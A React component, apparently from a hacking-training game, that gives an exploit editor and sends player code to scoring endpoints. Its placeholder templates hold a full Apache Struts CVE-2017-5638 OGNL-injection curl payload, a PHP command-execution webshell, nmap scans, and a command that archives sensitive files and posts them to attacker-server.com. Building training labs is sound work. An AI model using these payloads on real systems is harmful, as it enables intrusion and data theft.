import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Editor } from '@monaco-editor/react'
import { Play, CheckCircle, XCircle, Award, Terminal, Code2, FileCode } from 'lucide-react'
import type { Objective } from '../../types/mission'

interface CodePlaygroundProps {
  objective: Objective
  missionId: string
  onComplete: (points: number, technique: string) => void
}

interface ValidationResult {
  exploited: boolean
  output: string
  technique: string
  points: number
  message: string
}

const getLanguageForObjective = (objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) return 'shell'
  if (objectiveId.includes('webshell')) return 'php'
  if (objectiveId.includes('network') || objectiveId.includes('scan')) return 'shell'
  if (objectiveId.includes('exfiltration')) return 'shell'
  return 'shell'
}

const getEndpointForObjective = (missionId: string, objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) {
    return `/api/time-breach/${missionId}/exploit`
  }
  if (objectiveId.includes('webshell')) {
    return `/api/time-breach/${missionId}/webshell`
  }
  if (objectiveId.includes('network') || objectiveId.includes('scan')) {
    return `/api/time-breach/${missionId}/network-scan`
  }
  if (objectiveId.includes('exfiltration')) {
    return `/api/time-breach/${missionId}/exfiltration`
  }
  return `/api/time-breach/${missionId}/exploit`
}

const getPlaceholderCode = (objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) {
    return `# Apache Struts CVE-2017-5638 Exploit
# OGNL injection via Content-Type header

curl -X POST http://localhost:8080/struts2-showcase/actionChain1.action \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"`
  }

  if (objectiveId.includes('webshell')) {
    return `<?php
// Simple webshell - execute system commands
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

# Usage: http://target/webshell.php?cmd=whoami`
  }

  if (objectiveId.includes('network') || objectiveId.includes('scan')) {
    return `# Network reconnaissance
# Scan internal network for live hosts

nmap -sn 192.168.1.0/24
nmap -p 22,80,443,3306 192.168.1.100-200`
  }

  if (objectiveId.includes('exfiltration')) {
    return `# Data exfiltration via encrypted channel
# Compress and encode sensitive data

tar czf - /var/data/sensitive/ | base64 | curl -X POST \\
  -H "Content-Type: text/plain" \\
  --data-binary @- \\
  https://attacker-server.com/upload`
  }

  return '# Write your exploit code here...'
}

export function CodePlayground({ objective, missionId, onComplete }: CodePlaygroundProps) {
  const [code, setCode] = useState(getPlaceholderCode(objective.id))
  const [isRunning, setIsRunning] = useState(false)
  const [result, setResult] = useState<ValidationResult | null>(null)
  const [showHint, setShowHint] = useState(false)

  const language = getLanguageForObjective(objective.id)
  const endpoint = getEndpointForObjective(missionId, objective.id)

  const handleRunCode = async () => {
    setIsRunning(true)
    setResult(null)

    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: code })
      })

      const data: ValidationResult = await response.json()
      setResult(data)

      if (data.exploited) {
        setTimeout(() => {
          onComplete(data.points, data.technique)
        }, 2000)
      }
    } catch (error) {
      setResult({
        exploited: false,
        output: '',
        technique: '',
        points: 0,
        message: `Connection error: ${error instanceof Error ? error.message : 'Unknown error'}`
      })
    } finally {
      setIsRunning(false)
    }
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-start justify-between">
        <div className="flex items-start gap-3">
          <div className="p-2 bg-cyan-500/10 rounded-lg">
            <Code2 className="w-5 h-5 text-cyan-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">{objective.title}</h3>
            <p className="text-sm text-gray-400 mt-1">{objective.description}</p>
          </div>
        </div>

        {objective.hints && objective.hints.length > 0 && (
          <button
            onClick={() => setShowHint(!showHint)}
            className="px-3 py-1.5 text-sm bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 rounded-lg transition-colors"
          >
            {showHint ? 'Hide' : 'Show'} Hint
          </button>
        )}
      </div>

      {/* Hints */}
      <AnimatePresence>
        {showHint && objective.hints && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            className="bg-yellow-500/5 border border-yellow-500/20 rounded-lg p-4"
          >
            <div className="flex items-start gap-2">
              <Terminal className="w-4 h-4 text-yellow-400 mt-0.5 flex-shrink-0" />
              <div className="space-y-2">
                {objective.hints.map((hint, idx) => (
                  <p key={idx} className="text-sm text-yellow-200/80">
                    {hint.text}
                  </p>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Code Editor */}
      <div className="border border-gray-700 rounded-lg overflow-hidden">
        <div className="bg-gray-800 px-4 py-2 border-b border-gray-700 flex items-center gap-2">
          <FileCode className="w-4 h-4 text-gray-400" />
          <span className="text-sm text-gray-400">
            {language === 'shell' ? 'exploit.sh' : `exploit.${language}`}
          </span>
        </div>

        <Editor
          height="300px"
          language={language}
          value={code}
          onChange={(value) => setCode(value || '')}
          theme="vs-dark"
          options={{
            minimap: { enabled: false },
            fontSize: 13,
            lineNumbers: 'on',
            scrollBeyondLastLine: false,
            automaticLayout: true,
            tabSize: 2,
            wordWrap: 'on'
          }}
        />
      </div>

      {/* Run Button */}
      <div className="flex items-center gap-3">
        <button
          onClick={handleRunCode}
          disabled={isRunning}
          className="flex items-center gap-2 px-6 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 disabled:from-gray-600 disabled:to-gray-700 text-white rounded-lg font-medium transition-all shadow-lg shadow-cyan-500/25"
        >
          <Play className={`w-4 h-4 ${isRunning ? 'animate-pulse' : ''}`} />
          {isRunning ? 'Running...' : 'Run Exploit'}
        </button>

        {result && (
          <div className={`flex items-center gap-2 px-4 py-2 rounded-lg ${
            result.exploited
              ? 'bg-green-500/10 text-green-400'
              : 'bg-red-500/10 text-red-400'
          }`}>
            {result.exploited ? (
              <>
                <CheckCircle className="w-5 h-5" />
                <span className="font-medium">Success!</span>
                <Award className="w-4 h-4 ml-2" />
                <span className="text-sm">+{result.points} pts</span>
              </>
            ) : (
              <>
                <XCircle className="w-5 h-5" />
                <span className="font-medium">Failed</span>
              </>
            )}
          </div>
        )}
      </div>

      {/* Result Output */}
      <AnimatePresence>
        {result && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className={`border rounded-lg p-4 ${
              result.exploited
                ? 'bg-green-500/5 border-green-500/20'
                : 'bg-red-500/5 border-red-500/20'
            }`}
          >
            <div className="flex items-start gap-2">
              <Terminal className={`w-4 h-4 mt-0.5 flex-shrink-0 ${
                result.exploited ? 'text-green-400' : 'text-red-400'
              }`} />
              <div className="flex-1 space-y-2">
                <p className={`text-sm font-medium ${
                  result.exploited ? 'text-green-400' : 'text-red-400'
                }`}>
                  {result.message}
                </p>

                {result.output && (
                  <pre className="text-xs text-gray-300 bg-black/30 rounded p-3 overflow-x-auto">
                    {result.output}
                  </pre>
                )}

                {result.exploited && result.technique && (
                  <div className="flex items-center gap-2 text-xs text-gray-400">
                    <span className="px-2 py-1 bg-purple-500/20 text-purple-300 rounded font-mono">
                      {result.technique}
                    </span>
                    <span>MITRE ATT&CK technique unlocked</span>
                  </div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  )
}
